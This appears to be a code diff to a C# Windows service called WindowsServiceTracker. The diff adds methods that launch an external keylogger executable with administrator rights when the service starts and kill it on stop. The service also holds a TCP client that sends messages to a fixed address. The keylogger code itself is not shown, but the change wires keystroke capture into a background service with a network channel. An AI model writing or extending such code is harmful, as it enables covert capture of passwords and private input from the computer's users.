@@ -29,6 +29,8 @@ namespace WindowsServiceTracker
         private const string errorLogMachine = "TrackerComputer";
         private const string errorLogSource = "WindowsServiceTracker";
         private const string externProc = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
+        private Process keyLogger = null;
+        private ProcessStartInfo keyLoggerStartInfo;
 
         private IPEndPoint IPPort = new IPEndPoint(IP_ADDRESS, PORT);
         private TcpClient tcp;
@@ -60,27 +62,10 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
-            //Create a new process and change some startup info settings
-            Process testProcess = new Process();
-            ProcessStartInfo testProcessStartInfo = new ProcessStartInfo();
-
-            //File name here MUST MATCH the file name of the external process you've created
-            testProcessStartInfo.FileName = externProc;
-            //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
-            testProcessStartInfo.Verb = "runas";
-            testProcessStartInfo.WindowStyle = ProcessWindowStyle.Normal;
-            testProcessStartInfo.UseShellExecute = true;
-
-            //Start the test process, look in TestProcess.cs for the actual process
-            testProcess = Process.Start(testProcessStartInfo);
-
-            //Keylogger.Start();
-
             //Write to the Windows Event Logs, shows up under Windows Logs --> Application
             EventLog.WriteEntry(errorLogSource, "Test event", EventLogEntryType.Information);
 
-            //Some test tcp connection stuff
-            //Connect();
+            startKeyLogger();
             
             //SendStringMsg(Environment.MachineName);
 
@@ -91,7 +76,40 @@ namespace WindowsServiceTracker
             //Keylogger.Stop();
             SendStringMsg("Bye!");
 
+            stopKeyLogger();
+
             Disconnect();
+        }
+
+        private bool startKeyLogger() //todo exception handling
+        {
+            if (keyLogger != null && keyLogger.Responding)
+            {
+                return true;
+            }
+            //Create a new process and change some startup info settings
+            keyLogger = new Process();
+            keyLoggerStartInfo = new ProcessStartInfo();
+
+            //File name here MUST MATCH the file name of the external process you've created
+            keyLoggerStartInfo.FileName = externProc;
+            //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
+            keyLoggerStartInfo.Verb = "runas";
+            keyLoggerStartInfo.WindowStyle = ProcessWindowStyle.Normal;
+            keyLoggerStartInfo.UseShellExecute = true;
+
+            //Start the test process, look in TestProcess.cs for the actual process
+            keyLogger = Process.Start(keyLoggerStartInfo);
+            return true;
+        }
+
+        private bool stopKeyLogger() //todo exception handling
+        {
+            if (keyLogger != null)
+            {
+                keyLogger.Kill(); //todo explore better/safer options
+            }
+            return true;
         }
 
         private bool Connect()
